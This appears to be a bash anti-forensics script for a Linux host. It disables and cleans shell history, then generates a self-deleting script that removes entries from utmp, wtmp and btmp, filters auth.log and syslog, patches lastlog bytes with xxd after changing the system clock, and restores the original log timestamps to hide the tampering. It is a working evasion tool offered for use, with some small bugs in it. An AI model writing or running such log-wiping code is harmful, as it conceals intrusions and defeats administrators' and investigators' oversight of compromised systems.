set_initial_variables() 
{
	LASTLOG_DATETIME=$(date -r /var/log/lastlog)
	AUTHLOG_DATETIME=$(date -r/var/log/auth.log)
	SYSLOG_DATETIME=$(date -r/var/log/syslog)
	UTMP_DATETIME=$(date -r /var/run/utmp)
	WTMP_DATETIME=$(date -r /var/log/wtmp)
	BTMP_DATETIME=$(date -r /var/log/btmp)
	BASH_LOGOUT_DATETIME=$(date -r ~/.bash_logout)
}

start_clean_history() 
{
	set +o history
	NUMBER=$(expr $(history | grep "set +o" | grep -v "grep" | gawk '{ print $1 }') - 1)
	history -d $NUMBER
}

main_method() 
{
	set_initial_variables
	start_clean_history
	cat "" > ~/.bash_logout
	cat << EOF > /tmp/aaa.sh
#!/bin/bash
#Set variables here
scrub_utmp() 
{
	utmpdump /var/run/utmp | egrep -v "SEARCHTERM" > /tmp/tmp_utmp
	utmpdump -r < /tmp/tmp_utmp > /var/run/utmp
	touch -d "$UTMP_DATETIME" /var/run/utmp
}

scrub_wtmp() 
{
	utmpdump /var/log/wtmp | egrep -v "SEARCHTERM" > /tmp/tmp_wtmp
	utmpdump -r < /tmp/tmp_wtmp > /var/log/wtmp
	touch -d "$WTMP_DATETIME" /var/log/wtmp
}

scrub_btmp() 
{
	utmpdump /var/log/btmp | egrep -v "SEARCHTERM" > /tmp/tmp_btmp
	utmpdump -r < /tmp/tmp_btmp > /var/log/btmp
	touch -d "$BTMP_DATETIME" /var/log/btmp
}

scrub_syslog() 
{
	grep -v "user\s" /var/log/syslog > /tmp/tmp_syslog
	mv /tmp/tmp_syslog  /var/log/syslog
	touch -d "$SYSLOG_DATETIME" /var/log/syslog/
}

scrub_authlog() 
{
	sleep 9
	egrep -v "root|ubuntu|logind" /var/log/auth.log > /tmp/tmp_authlog
	mv /tmp/tmp_authlog  /var/log/auth.log
	touch -d "$AUTHLOG_DATETIME" /var/log/auth.log
}

scrub_lastlog() 
{
  export date=$(date)
  export timestamp=`cat /var/log/auth.log | grep "New session.*ubuntu" | tail -n2 | head -n1 -c15`
  date --set="$timestamp"
  lastlog -Su ubuntu
  date --set="$date"

  tmp="$(utmpdump /var/log/wtmp | tail -n3 | head -n1)"
  userport="${tmp:31:12}"
  userip="${tmp:46:18}"
  uphex=`echo $userport | hd | head -n1 | cut -b 11-26`
  uihex=`echo $userip | hd | head -n1 | cut -b 11-58`
  tshex=`printf '%x' $(date --date="$timestamp" +%s) | xxd -e -g 8 | xxd -r | xxd -e -g 2 | xxd -r`
  portoffset=`xxd /var/log/lastlog | grep lastlog | head -c8`
  ipoffset1=`xxd /var/log/lastlog | grep localhost | head -c8`
  ipoffset2=`printf '%08x\n' $(( 16#$ipoffset1 + 16 ))`
  echo "$portoffset: $tshex $uphex 000 0000 0000" | xxd -r - /var/log/lastlog
  echo "$ipoffset1: 0000 0000 ${uihex:0:23} ${uihex:25:12}" | xxd -r - /var/log/lastlog
  echo "$ipoffset2: ${uihex:37:10} 00 0000 0000 0000 0000 0000 0000" | xxd -r - /var/log/lastlog

  unset tmp timestamp userport userip uphex uihex portoffset ipoffset1 ipoffset2
}

scrub_bash_logout() 
{
	grep -v "SEARCH TERM" ~/.bash_logout > /tmp/tmp_bash_logout
	mv /tmp/tmp_bash_logout ~/.bash_logout
}

main() 
{
	scrub_utmp
	scrub_wtmp
	scrub_btmp
	scrub_authlog
	scrub_syslog
	scrub_lastlog
	scrub_bash_logout
	rm /tmp/aaa.sh
}
main
EOF

}

main_method
